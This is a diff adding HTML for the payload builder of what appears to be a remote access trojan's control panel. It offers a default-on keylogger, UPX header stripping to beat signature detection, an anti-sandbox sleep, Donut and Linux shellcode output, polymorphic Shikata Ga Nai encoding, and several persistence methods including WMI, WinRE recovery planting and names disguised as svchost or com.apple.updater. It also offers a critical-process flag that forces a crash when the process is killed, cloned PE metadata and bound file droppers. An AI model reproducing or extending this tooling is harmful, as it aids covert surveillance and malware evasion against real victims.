+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-compress text-cyan-400"></i> UPX Compression
+                        </span>
+                        <span class="text-xs text-slate-500">Compress binaries with UPX (requires UPX on server)</span>
+                      </div>
+                    </label>
+
+                    <div id="upx-settings-container" class="hidden pl-3 border-l-2 border-cyan-500/40">
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer">
+                        <input type="checkbox" name="upx-strip-headers" class="w-4 h-4" />
+                        <div class="flex flex-col">
+                          <span>Strip UPX Headers</span>
+                          <span class="text-xs text-slate-500">Remove UPX magic bytes to avoid signature-based detection</span>
+                        </div>
+                      </label>
+                    </div>
+
+                    <div class="flex flex-col gap-1">
+                      <label class="block text-xs font-medium text-slate-400 mb-1" for="sleep-seconds">
+                        <i class="fa-solid fa-hourglass-half text-yellow-400"></i> Startup Sleep (seconds)
+                      </label>
+                      <input type="number" id="sleep-seconds" name="sleep-seconds" value="0"
+                        min="0" max="3600" step="1"
+                        class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-yellow-500 transition-colors" />
+                      <p class="text-xs text-slate-500">Sleep N seconds before connecting (anti-sandbox). Set to 0 to disable.</p>
+                    </div>
+
+                    <label class="flex items-center gap-2 p-3 bg-purple-900/30 border border-purple-500/40 rounded-lg cursor-pointer hover:border-purple-400 transition-colors">
+                      <input type="checkbox" id="cryptable-mode" name="cryptable-mode" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-microchip text-purple-400"></i> Cryptable Mode
+                        </span>
+                        <span class="text-xs text-slate-500">Disables persistence, UPX, PE metadata, UAC, bound files &amp; other disk-dependent settings for in-memory / shellcode use</span>
+                      </div>
+                    </label>
+                    <div id="cryptable-badge" class="hidden pl-3 border-l-2 border-purple-500/40">
+                      <div class="flex items-center gap-2 px-3 py-1.5 rounded bg-purple-800/40 border border-purple-600/40 text-xs text-purple-300">
+                        <i class="fa-solid fa-circle-check"></i>
+                        <span>Cryptable mode active — incompatible settings have been disabled</span>
+                      </div>
+                    </div>
+
+                    <div id="donut-row" class="hidden flex flex-col gap-1">
+                      <label class="flex items-center gap-2 p-3 bg-green-900/20 border border-green-500/30 rounded-lg cursor-pointer hover:border-green-400 transition-colors" data-shellcode-label>
+                        <input type="checkbox" id="donut-mode" name="donut-mode" class="w-4 h-4" />
+                        <div class="flex flex-col">
+                          <span class="flex items-center gap-2">
+                            <i class="fa-solid fa-pepper-hot text-green-400"></i> Donut Shellcode
+                          </span>
+                          <span class="text-xs text-slate-500">Convert Windows PE to position-independent shellcode (.bin) via Donut. PE metadata, icon, bound files, UPX, UAC, and critical-process are disabled. Persistence uses a two-pass build.</span>
+                        </div>
+                      </label>
+                      <div id="donut-cryptable-hint" class="hidden flex items-center gap-2 px-3 py-1.5 rounded bg-purple-900/30 border border-purple-600/40 text-xs text-purple-300">
+                        <i class="fa-solid fa-lock"></i>
+                        <span>Enable <strong>Cryptable Mode</strong> above to use Donut shellcode.</span>
+                      </div>
+                      <div id="donut-badge" class="hidden pl-3 border-l-2 border-green-500/40 flex flex-col gap-1">
+                        <div class="flex items-center gap-2 px-3 py-1.5 rounded bg-green-900/30 border border-green-600/40 text-xs text-green-300">
+                          <i class="fa-solid fa-circle-check"></i>
+                          <span>Donut mode active — Windows builds output position-independent shellcode (.bin)</span>
+                        </div>
+                        <label class="flex items-center gap-2 px-3 py-1.5 rounded bg-slate-800/60 border border-slate-600/40 text-xs text-slate-300 cursor-pointer hover:border-slate-400 transition-colors">
+                          <input type="checkbox" id="shellcode-console" name="shellcode-console" class="w-3.5 h-3.5" />
+                          <i class="fa-solid fa-terminal text-slate-400"></i>
+                          <span>Show console window — calls <code>AllocConsole()</code> on start (debug builds only)</span>
+                        </label>
+                        <div id="donut-nonwin-warn" class="hidden flex items-center gap-2 px-3 py-1.5 rounded bg-yellow-900/30 border border-yellow-600/40 text-xs text-yellow-300">
+                          <i class="fa-solid fa-triangle-exclamation"></i>
+                          <span>Non-Windows targets selected — Donut only applies to Windows builds; other platforms build normally</span>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div id="linux-sc-row" class="hidden flex flex-col gap-1">
+                      <label class="flex items-center gap-2 p-3 bg-cyan-900/20 border border-cyan-500/30 rounded-lg cursor-pointer hover:border-cyan-400 transition-colors" data-shellcode-label>
+                        <input type="checkbox" id="linux-shellcode-mode" name="linux-shellcode-mode" class="w-4 h-4" />
+                        <div class="flex flex-col">
+                          <span class="flex items-center gap-2">
+                            <i class="fa-brands fa-linux text-cyan-400"></i> Linux Shellcode
+                          </span>
+                          <span class="text-xs text-slate-500">Wrap Linux amd64 ELF in a position-independent shellcode stub (.bin) using memfd_create + execveat. Bound files and UPX are disabled. Persistence uses a two-pass build.</span>
+                        </div>
+                      </label>
+                      <div id="linux-sc-cryptable-hint" class="hidden flex items-center gap-2 px-3 py-1.5 rounded bg-purple-900/30 border border-purple-600/40 text-xs text-purple-300">
+                        <i class="fa-solid fa-lock"></i>
+                        <span>Enable <strong>Cryptable Mode</strong> above to use Linux shellcode.</span>
+                      </div>
+                      <div id="linux-sc-badge" class="hidden pl-3 border-l-2 border-cyan-500/40 flex flex-col gap-1">
+                        <div class="flex items-center gap-2 px-3 py-1.5 rounded bg-cyan-900/30 border border-cyan-600/40 text-xs text-cyan-300">
+                          <i class="fa-solid fa-circle-check"></i>
+                          <span>Linux shellcode mode active — linux-amd64 builds output shellcode (.bin)</span>
+                        </div>
+                        <div id="linux-sc-nonx64-warn" class="hidden flex items-center gap-2 px-3 py-1.5 rounded bg-yellow-900/30 border border-yellow-600/40 text-xs text-yellow-300">
+                          <i class="fa-solid fa-triangle-exclamation"></i>
+                          <span>Non-amd64 Linux targets selected — shellcode stub only supports x86_64; other platforms build normally</span>
+                        </div>
+                      </div>
+                    </div>
+
+                    <div id="sgn-row" class="hidden flex flex-col gap-1">
+                      <label class="flex items-center gap-2 p-3 bg-fuchsia-900/20 border border-fuchsia-500/30 rounded-lg cursor-pointer hover:border-fuchsia-400 transition-colors">
+                        <input type="checkbox" id="sgn-mode" name="sgn-mode" class="w-4 h-4" />
+                        <div class="flex flex-col">
+                          <span class="flex items-center gap-2">
+                            <i class="fa-solid fa-shuffle text-fuchsia-400"></i> SGN Polymorphic Encoding
+                          </span>
+                          <span class="text-xs text-slate-500">Apply Shikata Ga Nai polymorphic XOR encoding to the raw shellcode after Donut / Linux shellcode wrap. Each iteration adds a fresh decoder + re-encodes — higher = better evasion, larger output.</span>
+                        </div>
+                      </label>
+                      <div id="sgn-badge" class="hidden pl-3 border-l-2 border-fuchsia-500/40 flex flex-col gap-1">
+                        <div class="flex items-center gap-2 px-3 py-1.5 rounded bg-fuchsia-900/30 border border-fuchsia-600/40 text-xs text-fuchsia-300">
+                          <i class="fa-solid fa-circle-check"></i>
+                          <span>SGN active — shellcode will be polymorphically encoded</span>
+                        </div>
+                        <label class="flex items-center gap-2 px-3 py-1.5 rounded bg-slate-800/60 border border-slate-600/40 text-xs text-slate-300">
+                          <i class="fa-solid fa-repeat text-slate-400"></i>
+                          <span>Iterations</span>
+                          <input type="number" id="sgn-iterations" name="sgn-iterations" min="1" max="50" value="1" class="w-16 px-2 py-0.5 bg-slate-900 border border-slate-600 rounded text-slate-200 text-xs" />
+                          <span class="text-slate-500">(1–50)</span>
+                        </label>
+                      </div>
+                    </div>
+
+                  </div>
+                </div>
+              </div>
+
+              <!-- == Section 4: Features == -->
+              <div class="accordion-section border border-slate-800 rounded-lg overflow-hidden" data-open="true" data-builder-panel="features" hidden>
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-solid fa-puzzle-piece text-cyan-400"></i> Features
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3 flex flex-col gap-2">
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-amber-500 transition-colors">
+                      <input type="checkbox" name="enable-keylogger" class="w-4 h-4" checked />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-keyboard text-amber-400"></i> Keylogger
+                        </span>
+                        <span class="text-xs text-slate-500">Captures keystrokes with window titles on target</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-amber-500 transition-colors">
+                      <input type="checkbox" name="enable-webrtc" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-tower-broadcast text-amber-400"></i> WebRTC
+                        </span>
+                        <span class="text-xs text-slate-500">Compile Pion into the agent for WebRTC streaming (P2P + relayed). Adds ~6&nbsp;MB to the binary; leave off if not needed.</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-green-500 transition-colors">
+                      <input type="checkbox" name="enable-nvenc" class="w-4 h-4" checked />
+                      <div class="flex flex-col">
+                        <span><i class="fa-solid fa-microchip text-green-400 mr-2"></i>Include NVIDIA NVENC</span>
+                        <span class="text-xs text-slate-500">Native NVIDIA H.264 acceleration for Windows CGO builds</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-red-500 transition-colors">
+                      <input type="checkbox" name="enable-amf" class="w-4 h-4" checked />
+                      <div class="flex flex-col">
+                        <span><i class="fa-solid fa-microchip text-red-400 mr-2"></i>Include AMD AMF</span>
+                        <span class="text-xs text-slate-500">Native AMD H.264 acceleration for Windows CGO builds</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-blue-500 transition-colors">
+                      <input type="checkbox" name="enable-qsv" class="w-4 h-4" checked />
+                      <div class="flex flex-col">
+                        <span><i class="fa-solid fa-microchip text-blue-400 mr-2"></i>Include Intel Quick Sync</span>
+                        <span class="text-xs text-slate-500">Native Intel oneVPL H.264 acceleration for Windows CGO builds</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-amber-500 transition-colors">
+                      <input type="checkbox" name="enable-winre" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-shield-halved text-amber-400"></i> WinRE Persistence
+                        </span>
+                        <span class="text-xs text-slate-500">Compile WinRE persistence support into the agent (Windows only). Allows planting the agent into <code>C:\Recovery\OEM\</code> to survive a Windows push reset. Not included in macOS/Linux builds regardless of this setting.</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-amber-500 transition-colors">
+                      <input type="checkbox" name="fetch-public-ip" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-globe text-amber-400"></i> Fetch Real Public IP
+                        </span>
+                        <span class="text-xs text-slate-500">Agent queries <code>api.ipify.org</code> at connect time and reports the result as its IP. Bypasses NAT/proxy detection on the server side. Generates one outbound HTTPS request to a third party.</span>
+                      </div>
+                    </label>
+
+                    <div class="border-t border-slate-700/50 my-1"></div>
+                    <span class="text-xs text-slate-400 font-medium px-1">Hardware Collection</span>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-emerald-500 transition-colors">
+                      <input type="checkbox" name="collect-cpu" class="w-4 h-4" checked />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-microchip text-emerald-400"></i> Collect CPU Info
+                        </span>
+                        <span class="text-xs text-slate-500">Reports CPU model name to the server for hardware identification</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-emerald-500 transition-colors">
+                      <input type="checkbox" name="collect-gpu" class="w-4 h-4" checked />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-display text-emerald-400"></i> Collect GPU Info
+                        </span>
+                        <span class="text-xs text-slate-500">Reports GPU model name(s) to the server for hardware identification</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-emerald-500 transition-colors">
+                      <input type="checkbox" name="collect-ram" class="w-4 h-4" checked />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-memory text-emerald-400"></i> Collect RAM Info
+                        </span>
+                        <span class="text-xs text-slate-500">Reports total physical memory to the server</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-emerald-500 transition-colors">
+                      <input type="checkbox" name="collect-storage" class="w-4 h-4" checked />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-hard-drive text-emerald-400"></i> Collect Storage Info
+                        </span>
+                        <span class="text-xs text-slate-500">Reports total disk size to the server for capacity planning</span>
+                      </div>
+                    </label>
+
+                  </div>
+                </div>
+              </div>
+
+              <!-- == Section 5: Persistence (collapsed) == -->
+              <div class="accordion-section border border-slate-800 rounded-lg overflow-hidden" data-open="false" data-builder-panel="packaging" hidden>
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-solid fa-power-off text-orange-400"></i>
+                    Persistence
+                    <span class="text-xs text-slate-500 font-normal">Auto-start on boot</span>
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3 flex flex-col gap-2">
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                      <input type="checkbox" name="enable-persistence" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-power-off text-orange-400"></i> Enable Persistence
+                        </span>
+                        <span class="text-xs text-slate-500">Agent will start automatically with system boot</span>
+                      </div>
+                    </label>
+
+                    <div id="persistence-method-container" class="hidden pl-3 border-l-2 border-orange-500/40 flex flex-col gap-3">
+                      <div id="persistence-empty-state" class="hidden text-xs text-slate-500 pt-1">
+                        No supported persistence targets selected. Select Windows, Linux, or macOS targets to configure persistence.
+                      </div>
+
+                      <div id="persistence-windows-settings" class="hidden" data-persistence-os="windows">
+                        <div class="text-xs font-semibold text-slate-300 mb-2 flex items-center gap-2">
+                          <i class="fa-brands fa-windows text-blue-400"></i> Windows Persistence Methods
+                          <span class="text-xs text-slate-500 font-normal">(select one or more)</span>
+                        </div>
+                        <div class="flex flex-col gap-2" id="persistence-methods-list">
+                          <label class="flex items-center gap-2 p-2 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                            <input type="checkbox" name="persistence-method" value="startup" class="w-4 h-4" checked />
+                            <div class="flex flex-col">
+                              <span class="text-sm text-slate-200">Startup Folder (APPDATA)</span>
+                              <span class="text-xs text-slate-500">Copies agent to user startup folder — no admin required</span>
+                            </div>
+                          </label>
+                          <label class="flex items-center gap-2 p-2 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                            <input type="checkbox" name="persistence-method" value="registry" class="w-4 h-4" />
+                            <div class="flex flex-col">
+                              <span class="text-sm text-slate-200">Registry (HKCU Run key)</span>
+                              <span class="text-xs text-slate-500">Adds a Run key under HKCU — no admin required</span>
+                            </div>
+                          </label>
+                          <label class="flex items-center gap-2 p-2 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                            <input type="checkbox" name="persistence-method" value="taskscheduler" class="w-4 h-4" />
+                            <div class="flex flex-col">
+                              <span class="text-sm text-slate-200">Task Scheduler (ONLOGON)</span>
+                              <span class="text-xs text-slate-500 text-orange-400/80">Requires admin privileges</span>
+                            </div>
+                          </label>
+                          <label class="flex items-center gap-2 p-2 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                            <input type="checkbox" name="persistence-method" value="wmi" class="w-4 h-4" />
+                            <div class="flex flex-col">
+                              <span class="text-sm text-slate-200">WMI Subscription</span>
+                              <span class="text-xs text-slate-500 text-orange-400/80">Requires admin privileges</span>
+                            </div>
+                          </label>
+                        </div>
+                      </div>
+
+                      <div id="persistence-linux-settings" class="hidden" data-persistence-os="linux">
+                        <div class="text-xs font-semibold text-slate-300 mb-1 flex items-center gap-2">
+                          <i class="fa-brands fa-linux text-amber-400"></i> Linux Persistence
+                        </div>
+                        <p class="text-xs text-slate-500">
+                          Uses user-level <code>systemd</code> service when available; falls back to desktop autostart.
+                        </p>
+                      </div>
+
+                      <div id="persistence-macos-settings" class="hidden" data-persistence-os="darwin">
+                        <div class="text-xs font-semibold text-slate-300 mb-1 flex items-center gap-2">
+                          <i class="fa-brands fa-apple text-slate-200"></i> macOS Persistence
+                        </div>
+                        <p class="text-xs text-slate-500">
+                          Uses <code>LaunchAgents</code> for login persistence. The startup name is used as the plist label and <strong class="text-orange-400">must start with <code>com.</code></strong> (e.g. <code>com.apple.updater</code>).
+                        </p>
+                      </div>
+
+                      <div id="persistence-startup-name-container" class="hidden">
+                        <div class="text-xs font-semibold text-slate-300 mb-2 flex items-center gap-2">
+                          <i class="fa-solid fa-file-signature text-blue-400"></i> Startup File Name
+                        </div>
+                        <input type="text" id="startup-name" name="startup-name" maxlength="32"
+                          pattern="[A-Za-z0-9_.-]+"
+                          placeholder="ovd (default)"
+                          class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-orange-500 transition-colors placeholder:text-slate-600" />
+                        <p class="text-xs text-slate-500 mt-1">Custom name for the installed executable. On Windows: used as filename (<code>svchost</code> → <code>svchost.exe</code>). On macOS: also used as the LaunchAgent label — <span id="startup-name-macos-hint" class="hidden text-orange-400 font-medium">must start with <code>com.</code> (e.g. <code>com.apple.updater</code>).</span><span id="startup-name-default-hint">Leave blank for a default randomized name.</span></p>
+                        <p id="startup-name-error" class="hidden text-xs text-red-400 mt-1 font-medium"></p>
+                      </div>
+                    </div>
+
+                  </div>
+                </div>
+              </div>
+
+              <!-- == Section 6: Windows Settings (hidden until a windows-* platform is checked) == -->
+              <div id="windows-settings-section" class="accordion-section border border-slate-800 rounded-lg overflow-hidden hidden" data-open="false" data-builder-panel="packaging">
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-brands fa-windows text-blue-400"></i>
+                    Windows Settings
+                    <span class="text-[10px] uppercase tracking-wider px-1.5 py-0.5 rounded bg-blue-900/60 text-blue-300 border border-blue-700/50 font-semibold">Windows only</span>
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3 flex flex-col gap-4">
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                      <input type="checkbox" name="require-admin" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-shield-halved text-orange-400"></i> Require Administrator (UAC)
+                        </span>
+                        <span class="text-xs text-slate-500">Embeds a manifest requesting UAC elevation on launch</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-red-500 transition-colors">
+                      <input type="checkbox" name="critical-process" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-skull text-red-400"></i> Critical Process
+                        </span>
+                        <span class="text-xs text-slate-500">If running as admin, marks the process as critical — killing it without disconnect/uninstall triggers a BSOD</span>
+                      </div>
+                    </label>
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2 flex items-center gap-2">
+                        <i class="fa-solid fa-clone text-cyan-400"></i> Clone Metadata from File
+                        <span class="text-xs text-slate-500 font-normal">Copies metadata &amp; icon from an existing PE</span>
+                      </label>
+                      <div class="flex items-center gap-3 flex-wrap">
+                        <label class="flex items-center gap-2 px-4 py-2 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-cyan-500 transition-colors text-sm">
+                          <i class="fa-solid fa-file-import text-cyan-400"></i>
+                          <span id="clone-exe-label">Choose .exe / .dll file</span>
+                          <input type="file" id="clone-exe-upload" accept=".exe,.dll,.scr,.sys,.ocx" class="hidden" />
+                        </label>
+                        <span id="clone-exe-status" class="text-xs hidden"></span>
+                      </div>
+                    </div>
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2 flex items-center gap-2">
+                        <i class="fa-solid fa-file-code text-blue-400"></i> PE / Assembly Metadata
+                      </label>
+                      <div class="flex flex-col gap-2">
+                        <input type="text" id="assembly-title" name="assembly-title" placeholder="File Description"
+                          class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors" />
+                        <input type="text" id="assembly-product" name="assembly-product" placeholder="Product Name"
+                          class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors" />
+                        <input type="text" id="assembly-company" name="assembly-company" placeholder="Company Name"
+                          class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors" />
+                        <input type="text" id="assembly-version" name="assembly-version" placeholder="File Version (e.g. 1.0.0.0)"
+                          class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors" />
+                        <input type="text" id="assembly-copyright" name="assembly-copyright" placeholder="Copyright"
+                          class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors" />
+                      </div>
+                    </div>
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2 flex items-center gap-2">
+                        <i class="fa-solid fa-image text-yellow-400"></i> Custom Icon
+                        <span class="text-xs text-slate-500 font-normal">.ico, max 1MB</span>
+                      </label>
+                      <div class="flex items-center gap-3">
+                        <label class="flex items-center gap-2 px-4 py-2 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-yellow-500 transition-colors text-sm">
+                          <i class="fa-solid fa-upload text-yellow-400"></i>
+                          <span id="icon-label">Choose .ico file</span>
+                          <input type="file" id="icon-upload" name="icon-upload" accept=".ico" class="hidden" />
+                        </label>
+                        <button type="button" id="icon-clear" class="hidden text-xs text-red-400 hover:text-red-300">Clear</button>
+                      </div>
+                    </div>
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2 flex items-center gap-2">
+                        <i class="fa-solid fa-file-export text-purple-400"></i> Output Type
+                        <span class="text-xs text-slate-500 font-normal">Windows file extension</span>
+                      </label>
+                      <select id="output-extension" name="output-extension"
+                        class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors">
+                        <option value=".exe">.exe — Standard Executable</option>
+                        <option value=".scr">.scr — Screen Saver</option>
+                        <option value=".bat">.bat — Batch Script</option>
+                        <option value=".cmd">.cmd — Command Script</option>
+                        <option value=".ps1">.ps1 — PowerShell Script</option>
+                        <option value=".pif">.pif — Program Info File</option>
+                        <option value=".com">.com — MS-DOS Application</option>
+                      </select>
+                    </div>
+
+                  </div>
+                </div>
+              </div>
+
+              <!-- == Section 6: Bind Files (collapsed) == -->
+              <div class="accordion-section border border-slate-800 rounded-lg overflow-hidden" data-open="false" data-builder-panel="packaging" hidden>
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-solid fa-paperclip text-violet-400"></i>
+                    Bind Files
+                    <span class="text-xs text-slate-500 font-normal">Embed &amp; run files on startup</span>
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3 flex flex-col gap-3">
+
+                    <p class="text-xs text-slate-400">
+                      Files are embedded inside the agent binary and written to a temp directory when the agent starts.
+                      Up to 5 files, 50 MB each. Files set to <em>Execute</em> are launched immediately after being dropped.
+                    </p>
+
+                    <!-- macOS Gatekeeper note -->
+                    <div class="flex items-start gap-2 p-3 bg-amber-900/20 border border-amber-700/40 rounded-lg text-xs text-amber-300">
+                      <i class="fa-brands fa-apple mt-0.5 shrink-0"></i>
+                      <span>
+                        <strong>macOS note:</strong> Files are written programmatically and do <em>not</em> receive the quarantine flag,
+                        so Gatekeeper usually will not block them. However, on newer macOS versions (Ventura+) unsigned binaries may
+                        still be restricted depending on system policy.
+                      </span>
+                    </div>
+
+                    <!-- Bound file list -->
+                    <div id="bind-files-list" class="flex flex-col gap-2"></div>
+
+                    <!-- Add file button -->
+                    <label id="bind-add-label" class="flex items-center justify-center gap-2 px-4 py-2 rounded-lg border border-dashed border-slate-600 cursor-pointer hover:border-violet-500 transition-colors text-sm text-slate-400 hover:text-violet-400">
+                      <i class="fa-solid fa-plus"></i> Add File
+                      <input type="file" id="bind-file-input" class="hidden" />
+                    </label>
+
+                  </div>
+                </div>
+              </div>
+
+              <!-- == Build Plugin Settings (loaded from server-side plugins) == -->
+              <div id="build-plugins-section" class="accordion-section border border-slate-800 rounded-lg overflow-hidden hidden" data-open="false" data-builder-panel="packaging">
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-solid fa-puzzle-piece text-fuchsia-400"></i>
+                    Build Plugins
+                    <span id="build-plugins-count" class="text-xs text-slate-500 font-normal"></span>
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3 flex flex-col gap-3">
+                    <div id="build-plugins-list" class="flex flex-col gap-3"></div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Build Button -->
+              <div class="flex gap-2">
+                <button type="submit" id="build-btn"
+                  class="flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
+                  <i class="fa-solid fa-hammer"></i>
+                  <span>Start Build</span>
+                </button>
+
+                <button type="button" id="build-update-all-btn"
+                  class="flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg bg-amber-600 hover:bg-amber-700 text-white font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
+                  <i class="fa-solid fa-arrow-up-from-bracket"></i>
+                  <span>Build &amp; Update All</span>
+                </button>
+
+                <button type="button" id="build-upload-btn"
+                  class="flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
+                  <i class="fa-solid fa-cloud-arrow-up"></i>
+                  <span>Build &amp; Upload</span>
+                </button>
+              </div>
+              <div id="build-sgn-txt-lockbox" class="sgn-txt-lockbox locked hidden">
+                <button type="button" id="build-sgn-txt-btn"
+                  class="w-full flex items-center justify-center gap-2 px-4 py-3 rounded-lg bg-fuchsia-600 hover:bg-fuchsia-700 text-white font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
+                  <i class="fa-solid fa-file-lines"></i>
+                  <span>Build SGN TXT</span>
+                </button>
+                <div class="sgn-txt-cracks" aria-hidden="true">
+                  <svg viewBox="0 0 100 36" preserveAspectRatio="none">
+                    <path class="crack-main" pathLength="1" d="M50 1 L46 7 L54 13 L48 20 L52 27 L49 35" />
+                    <path class="crack-branch" pathLength="1" d="M46 7 L35 4 L22 9 L10 7" />
+                    <path class="crack-branch" pathLength="1" d="M54 13 L67 9 L82 14 L95 11" />
+                    <path class="crack-branch" pathLength="1" d="M48 20 L34 22 L20 29 L6 31" />
+                    <path class="crack-branch" pathLength="1" d="M51 24 L65 25 L80 31 L98 29" />
+                    <path class="crack-branch" pathLength="1" d="M49 31 L39 34 L30 35" />
+                    <path class="crack-mid" pathLength="1" d="M18 3 L25 10 L21 17 L30 23 L27 34" />
+                    <path class="crack-mid" pathLength="1" d="M79 2 L73 8 L78 16 L70 21 L74 33" />
